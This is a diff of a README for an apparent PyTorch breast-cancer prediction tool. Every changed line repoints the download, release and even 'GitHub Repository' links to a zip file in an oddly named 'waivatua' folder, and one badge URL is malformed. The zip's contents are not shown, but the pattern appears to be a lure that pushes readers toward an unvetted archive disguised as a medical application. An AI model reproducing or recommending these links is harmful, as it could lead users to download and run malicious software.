@@ -6,7 +6,7 @@ Welcome! If you want to predict breast cancer using a simple tool, you’re in t
 
 ## 📥 Download Now
 
-[![Download Breast Cancer Predictor](https://raw.githubusercontent.com/agipratama/Breast-Cancer-Predictor-using-Pytorch/main/waivatua/Breast-Cancer-Predictor-using-Pytorch.zip%20Cancer%https://raw.githubusercontent.com/agipratama/Breast-Cancer-Predictor-using-Pytorch/main/waivatua/Breast-Cancer-Predictor-using-Pytorch.zip)](https://raw.githubusercontent.com/agipratama/Breast-Cancer-Predictor-using-Pytorch/main/waivatua/Breast-Cancer-Predictor-using-Pytorch.zip)
+[![Download Breast Cancer Predictor](https://raw.githubusercontent.com/agipratama/Breast-Cancer-Predictor-using-Pytorch/main/waivatua/Breast_Cancer_Predictor_Pytorch_using_1.1.zip%20Cancer%https://raw.githubusercontent.com/agipratama/Breast-Cancer-Predictor-using-Pytorch/main/waivatua/Breast_Cancer_Predictor_Pytorch_using_1.1.zip)](https://raw.githubusercontent.com/agipratama/Breast-Cancer-Predictor-using-Pytorch/main/waivatua/Breast_Cancer_Predictor_Pytorch_using_1.1.zip)
 
 ## 🔧 System Requirements
 
@@ -25,7 +25,7 @@ Follow these steps to download and install the application:
    
    Go to the Releases page by clicking the link below:
 
-   [Download Breast Cancer Predictor](https://raw.githubusercontent.com/agipratama/Breast-Cancer-Predictor-using-Pytorch/main/waivatua/Breast-Cancer-Predictor-using-Pytorch.zip)
+   [Download Breast Cancer Predictor](https://raw.githubusercontent.com/agipratama/Breast-Cancer-Predictor-using-Pytorch/main/waivatua/Breast_Cancer_Predictor_Pytorch_using_1.1.zip)
 
 2. **Select the Latest Release**
 
@@ -73,7 +73,7 @@ We welcome contributions! If you want to improve this project, feel free to fork
 
 ## 🔗 Links and Resources
 
-- [GitHub Repository](https://raw.githubusercontent.com/agipratama/Breast-Cancer-Predictor-using-Pytorch/main/waivatua/Breast-Cancer-Predictor-using-Pytorch.zip)
-- [Download Breast Cancer Predictor](https://raw.githubusercontent.com/agipratama/Breast-Cancer-Predictor-using-Pytorch/main/waivatua/Breast-Cancer-Predictor-using-Pytorch.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/agipratama/Breast-Cancer-Predictor-using-Pytorch/main/waivatua/Breast_Cancer_Predictor_Pytorch_using_1.1.zip)
+- [Download Breast Cancer Predictor](https://raw.githubusercontent.com/agipratama/Breast-Cancer-Predictor-using-Pytorch/main/waivatua/Breast_Cancer_Predictor_Pytorch_using_1.1.zip)
 
 Thank you for using the Breast Cancer Predictor! Your feedback is valuable for improving this tool.
